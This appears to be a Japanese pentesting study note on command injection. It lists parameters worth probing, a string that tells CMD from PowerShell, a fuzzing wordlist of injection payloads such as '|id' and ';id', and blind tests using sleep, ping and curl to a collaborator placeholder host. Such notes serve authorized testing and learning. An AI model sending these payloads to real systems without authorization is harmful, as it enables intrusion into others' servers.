[[⚡️Command injection]]

#### 注目ポイント

- Submit FeetbackページのEmailパラメタ
- ファイル操作(プロフィール画像投稿）
- メール送信リクエスト
- クエリパラメタでの在庫情報検索

---
## Detect

- 怪しいパラメタをIntruderで選択してScan。1分くらいで検出する
- 🔦ターゲットのWebアプリがWindowsの場合、CMDかPowerShellのどちらで実行されているか判別する。
```cmd
(dir 2&gt;&amp;1 *`|echo CMD);&amp;&lt;# rem #&gt;echo PowerShell
```
	- "CMD" が表示される → CMD 環境
	- "PowerShell" が表示される → PowerShell 環境

---
## Fuzz

#### 非blind

- 怪しいパラメタの値をIntruderにかける。コマンド出力結果やエラーメッセージを観測
```zsh
|id
||id||
|aaa
||aaa||
```

###### fuzzing wordlist

```txt
|id
||id||
|aaa
||aaa||
|id|
|aaa|
#id
#id#
#aaa
#aaa#
&id
&id&
&aaa
&aaa&
&&id
&&id&&
&&aaa
&&aaa&&
;id
;id;
;aaa
;aaa;
```
​
#### blind

```zsh
|curl https://COLLABORATOR_DOMAIN/
||curl https://COLLABORATOR_DOMAIN/||

|sleep 10
||sleep 10||

|ping -c 10 127.0.0.1
||ping -c 10 127.0.0.1||
```
- これでもうまくいかない時は[[Command injection#コマンド注入用の特殊文字リスト]]を使って`|`を別の文字に変更する